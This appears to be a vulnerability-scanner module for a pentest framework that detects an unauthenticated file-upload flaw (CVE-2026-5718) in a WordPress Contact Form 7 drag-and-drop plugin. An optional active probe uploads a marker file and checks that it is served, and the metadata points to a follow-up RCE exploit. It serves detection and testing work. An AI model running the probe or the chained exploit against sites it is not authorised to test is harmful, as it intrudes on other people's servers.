#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drag and Drop CF7 <= 1.3.9.6 unauthenticated upload (CVE-2026-5718)."""

from __future__ import annotations

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "drag-and-drop-multiple-file-upload-contact-form-7"
_VULN_HIGH = (1, 3, 9)
_CF7_PAGES = ("/", "/contact/", "/contact-us/")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "CF7 drag-drop upload CVE-2026-5718 detect",
        "description": "CVE-2026-5718: dnd_codedropz_upload arbitrary file upload.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-5718",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-5718",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-5718.yaml",
        ],
        "modules": ["exploits/multi/http/cf7_dnd_upload_cve_2026_5718_rce"],
        "tags": ["web", "scanner", "wordpress", "contact-form-7", "file-upload", "cve-2026-5718"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/cf7_dnd_upload_cve_2026_5718_rce"],
            },
        },
    }

    active_probe = OptBool(False, "Upload .txt via dnd_codedropz_upload", required=False)

    _CF7_ID = re.compile(r'_wpcf7"(?:[^>]*value="|:)(\d+)', re.I)
    _NONCE = re.compile(r'"data":"([a-f0-9]+)"')

    def _cf7_form_id(self) -> str:
        for path in _CF7_PAGES:
            page = self.http_request(method="GET", path=path, allow_redirects=True)
            if not page or int(page.status_code) != 200:
                continue
            if "_wpcf7" not in (page.text or ""):
                continue
            match = self._CF7_ID.search(page.text or "")
            if match:
                return match.group(1)
        return ""

    def _dnd_nonce(self) -> str:
        resp = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            data="action=_wpcf7_check_nonce",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if not resp:
            return ""
        match = self._NONCE.search(resp.text or "")
        return match.group(1) if match else ""

    def _upload_txt(self, form_id: str, nonce: str, marker: str, fname: str) -> tuple[bool, str, str]:
        boundary = "---------------------------cf7dndboundary"
        body = (
            f"{boundary}\r\n"
            'Content-Disposition: form-data; name="action"\r\n\r\ndnd_codedropz_upload\r\n'
            f"{boundary}\r\n"
            f'Content-Disposition: form-data; name="security"\r\n\r\n{nonce}\r\n'
            f"{boundary}\r\n"
            f'Content-Disposition: form-data; name="form_id"\r\n\r\n{form_id}\r\n'
            f"{boundary}\r\n"
            'Content-Disposition: form-data; name="upload_name"\r\n\r\nupload-file\r\n'
            f"{boundary}\r\n"
            f'Content-Disposition: form-data; name="upload-file"; filename="{fname}.txt"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n{marker}\r\n"
            f"{boundary}--\r\n"
        )
        post = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        if not post or int(post.status_code) != 200:
            return False, "", ""
        text = post.text or ""
        if '"success":true' not in text:
            return False, "", ""
        renamed = re.search(r'"file":"([^"]+)"', text)
        subpath = re.search(r'"path":"([^"]+)"', text)
        if not renamed or not subpath:
            return False, "", ""
        verify = self.http_request(
            method="GET",
            path=f"/wp-content/uploads/wp_dndcf7_uploads/{subpath.group(1)}/{renamed.group(1)}",
        )
        ok = bool(verify and int(verify.status_code) == 200 and marker in (verify.text or ""))
        return ok, subpath.group(1), renamed.group(1)

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        readme = self.http_request(
            method="GET",
            path=f"/wp-content/plugins/{_PLUGIN}/readme.txt",
            allow_redirects=True,
        )
        if not readme or int(readme.status_code) != 200:
            return False
        if not version:
            version = self.wp_extract_version_from_readme(readme.text or "") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        form_id = self._cf7_form_id()
        if not form_id:
            self.set_info(
                severity="medium",
                cve="CVE-2026-5718",
                reason=(
                    f"CF7 drag-drop plugin {version} in range; "
                    "no Contact Form 7 markup found"
                ),
                version=version,
            )
            return True
        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-5718",
                reason=f"CF7 form {form_id} + vulnerable drag-drop uploader; upload not attempted",
                version=version,
            )
            return True
        nonce = self._dnd_nonce()
        if not nonce:
            return False
        marker = secrets.token_hex(8)
        fname = secrets.token_hex(3)
        ok, _, _ = self._upload_txt(form_id, nonce, marker, fname)
        if not ok:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-5718",
            reason="dnd_codedropz_upload stored and served uploaded content",
            version=version,
            confidence="high",
        )
        return True
